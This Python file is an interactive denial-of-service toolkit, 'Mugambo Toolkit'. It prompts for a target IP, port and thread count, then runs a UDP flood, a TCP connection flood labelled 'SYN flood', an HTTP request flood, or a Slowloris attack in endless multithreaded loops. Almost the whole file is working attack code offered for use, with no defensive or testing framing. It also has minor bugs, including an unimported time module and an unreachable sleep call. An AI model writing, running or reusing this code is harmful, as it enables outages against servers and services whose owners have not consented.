# Mugambo Toolkit by Toosii

import os
import socket
import random
import threading
import logging

logging.basicConfig(level=logging.INFO, format='%(message)s')

def slowloris_attack(target, port, timeout, sleep):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))

        headers = [
            "User-agent: Mozilla/5.0",
            "Accept-language: en-US,en,q=0.5"
        ]

        sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        for header in headers:
            sock.send(f"{header}\r\n".encode("utf-8"))

        return sock
    except Exception:
        return None

def run_pyslow(target, port=80, threads=100, timeout=5, sleep=15):
    logging.info(f"[+] Starting PySlow attack on {target}:{port} with {threads} threads")
    socket_list = []

    for _ in range(threads):
        s = slowloris_attack(target, port, timeout, sleep)
        if s:
            socket_list.append(s)

    while True:
        logging.info(f"[+] Sending keep-alive headers to {len(socket_list)} sockets")
        for s in socket_list:
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except Exception:
                socket_list.remove(s)

        for _ in range(threads - len(socket_list)):
            s = slowloris_attack(target, port, timeout, sleep)
            if s:
                socket_list.append(s)

    time.sleep(sleep)

def syn_packet(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target_ip, target_port))
        sock.send(random._urandom(1024))
    except:
        pass
    finally:
        sock.close()

def run_synflood(target_ip, target_port, threads=100):
    logging.info(f"[+] Starting SYN Flood attack on {target_ip}:{target_port} with {threads} threads")
    while True:
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=syn_packet, args=(target_ip, target_port))
            t.start()
            thread_list.append(t)
        for t in thread_list:
            t.join()

def send_http_request(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
        sock.send(request.encode())
        sock.close()
    except:
        pass

def run_httpreq(target_ip, target_port=80, threads=100):
    logging.info(f"[+] Starting HTTP Request Flood attack on {target_ip}:{target_port} with {threads} threads")
    while True:
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_http_request, args=(target_ip, target_port))
            t.start()
            thread_list.append(t)
        for t in thread_list:
            t.join()

def send_udp_packet(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(random._urandom(1024), (target_ip, target_port))
    sock.close()

def run_udpflood(target_ip, target_port, threads=100):
    logging.info(f"[+] Starting UDP Flood attack on {target_ip}:{target_port} with {threads} threads")
    while True:
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_udp_packet, args=(target_ip, target_port))
            t.start()
            thread_list.append(t)
        for t in thread_list:
            t.join()

def menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
     ▄▀▀▄ ▄▀▄  ▄▀▀▄ ▄▀▀▄  ▄▀▀▀▀▄    ▄▀▀█▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄   ▄▀▀▀▀▄  
    █  █ ▀  █ █   █    █ █         ▐ ▄▀ ▀▄ █  █ ▀  █ ▐ ▄▀   █ █      █ 
    ▐  █    █ ▐  █    █  █    ▀▄▄    █▄▄▄█ ▐  █    █   █▄▄▄▀  █      █ 
      █    █    █    █   █     █ █  ▄▀   █   █    █    █   █  ▀▄    ▄▀ 
    ▄▀   ▄▀      ▀▄▄▄▄▀  ▐▀▄▄▄▄▀ ▐ █   ▄▀  ▄▀   ▄▀    ▄▀▄▄▄▀    ▀▀▀▀   
    █    █               ▐         ▐   ▐   █    █    █    ▐            
    ▐    ▐                                 ▐    ▐    ▐                  
                                                                         
    
                 737k Mugambo Toolkit - @Pretty./Syambomobz_
""")
    print("[1] UDP Flood")
    print("[2] TCP SYN Flood")
    print("[3] HTTP Request Flood")
    print("[4] PySlow Attack")
    print("[0] Exit")

def main():
    while True:
        menu()
        choice = input("\nChoose option: ")

        if choice == "1":
            ip = input("Target IP: ")
            port = int(input("Port: "))
            threads = int(input("Threads: "))
            run_udpflood(ip, port, threads)  # UDP flood function
        elif choice == "2":
            ip = input("Target IP: ")
            port = int(input("Port: "))
            threads = int(input("Threads: "))
            run_synflood(ip, port, threads)
        elif choice == "3":
            ip = input("Target IP: ")
            port = int(input("Port: "))
            threads = int(input("Threads: "))
            run_httpreq(ip, port, threads)
        elif choice == "4":
            ip = input("Target IP: ")
            port = int(input("Port: "))
            threads = int(input("Threads: "))
            timeout = int(input("Socket timeout (default 5): "))
            sleep = int(input("Sleep time (default 15): "))
            run_pyslow(ip, port, threads, timeout, sleep)
        elif choice == "0":
            break
        else:
            print("[!] Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
